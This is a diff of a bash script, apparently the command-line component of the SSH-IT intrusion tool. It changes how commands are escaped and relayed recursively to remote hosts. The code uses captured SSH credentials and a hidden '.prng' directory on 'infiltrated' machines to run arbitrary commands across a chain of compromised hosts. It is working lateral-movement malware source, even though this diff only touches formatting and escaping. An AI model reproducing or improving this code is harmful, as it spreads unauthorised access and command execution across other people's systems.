@@ -122,16 +122,14 @@ do_not_uninstall()
 	echo -e "${PX}└── ${CDY}WARNING: NOT uninstalled${CN}"
 }
 
-
 do_list(){ true; }
 do_not_list(){ true; }
-
-
 
 do_not_exec()
 {
 	echo -e "${PX}└── ${CDY}WARNING: EXEC failed.${CN}"
 }
+
 
 do_exec()
 {
@@ -139,7 +137,7 @@ do_exec()
 
 	# sed to remove ansi color codes
 	# Bash specific 'set -o pipefail' is needed to catch exit code of last command before the pipe. 
-	(set -o pipefail; (bash -c "$THC_CLI_ARG" 2>&1) | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | while read -r l; do echo -e "${PX}│${CF}$l${CN}"; done) || { do_not_exec; exit 0; return; }
+	(set -o pipefail; (bash -c "$THC_CLI_ARG" 2>&1) | strip_ansi | while read -r l; do echo -e "${PX}│${CF}$l${CN}"; done) || { do_not_exec; exit 0; return; }
 	# (set -o pipefail; (bash -c "$THC_CLI_ARG" 2>&1)) || { do_not_exec; exit 0; return; }
 	echo -e "${PX}└── SUCCESS"
 }
@@ -156,8 +154,7 @@ recursive()
 	ret=0
 	loop_detect && return 0
 
-	# See COMMENT-1
-	dx="$(echo "${THC_T_PREFIX}"|tr '#' ' ')"
+	dx="${THC_T_PREFIX}"
 	PX="${dx}"
 
 	n_logins && n=0 || n=$?
@@ -188,14 +185,10 @@ recursive()
 
 		# Recursive. No need to login if DEPTH is 0 here (e.g. we did not infiltrate remote)
 		if [[ "$THC_DEPTH" -gt 0 ]]; then
-			# COMMENT-1
-			# SSH seems to strip whitespaces in variables?
-			# bash -c             "X=\"   \"; echo \"len=\${#X}-\${X}-\"" => len=3-   -
-			# command ssh $USER@0 "X=\"   \"; echo \"len=\${#X}-\${X}-\"" => len=1- -
-			NEW_T_PREFIX="${THC_T_PREFIX}│###"
-			[[ -n $IS_MARK_PX_LAST ]] && [[ $n -eq 0 ]] && NEW_T_PREFIX="${THC_T_PREFIX}####" # last host
+			NEW_T_PREFIX="${THC_T_PREFIX}│   "
+			[[ -n $IS_MARK_PX_LAST ]] && [[ $n -eq 0 ]] && NEW_T_PREFIX="${THC_T_PREFIX}    " # last host
 
-			# Must escape [$"'] so that 'bash -c' does not evaluate them. In particular we like this to work:
+			# Must escape [`$"'] so that 'bash -c' does not evaluate them. In particular we like this to work:
 			#     thc_cli -r exec 'echo user=$USER'
 			#     thc_cli -r exec 'bash -c "echo user=$USER"'
 			# without having to escape:
@@ -205,15 +198,18 @@ recursive()
 			#     X='$USER"'; echo 1=$X; bash -c "echo 2=$X"    # Should output 2=$USER"
 			#     X='$USER'"'"; echo 1=$X; bash -c "echo 2=$X"  # Should output 2=$USER'
 			#     X='$USER$$'; echo 1=$X; bash -c "echo 2=$X"   # Should output 2=$USER$$
+			# https://www.oreilly.com/library/view/learning-the-bash/1565923472/ch01s09.html
 
 			# We need to consider the special case when we got the login credentials but
 			# SSH-IT is not installed on the remote host. In this case we still like to execute
 			# our command but must do so without ~/.prng/thc_cli being available on the remote side
 			if [[ -n $THC_CLI_ARG ]]; then
-				NEW_THC_CLI_ARG="$(echo "$THC_CLI_ARG"|sed 's/[\\$\"'"'"']/\\&/g')"
-				nPX="$(echo "${NEW_T_PREFIX}"|tr '#' ' ')"
+				NEW_THC_CLI_ARG="$(echo "$THC_CLI_ARG"|sed 's/[`\\$\"'"'"']/\\&/g')"
+				# nPX="$(echo "${NEW_T_PREFIX}"|tr '#' ' ')"
+				nPX="${NEW_T_PREFIX}"
+
 				# Use 'kill $$' to detect if command executed successfully (neater would be to use 'set -o pipefail'
-				# but this shell might not be a bash shell....)
+				# but the remote shell might not be a bash shell....)
 				new_arg="source .prng/seed 2>/dev/null && [[ -f \"\${THC_BASEDIR}/thc_cli\" ]] && THC_SEEN_ID=\"${THC_SEEN_ID_LOCAL}\" \
 					THC_IS_REMOTE=1 THC_CLI_ARG=\"$NEW_THC_CLI_ARG\" THC_DEBUG=\"${THC_DEBUG}\" THC_T_PREFIX=\"${NEW_T_PREFIX}\" \
 					THC_SSH_DESTINATION=\"${LOG_SSH_DESTINATION}\" \"\${THC_BASEDIR}/thc_cli\" -r \"$cmd\" || \
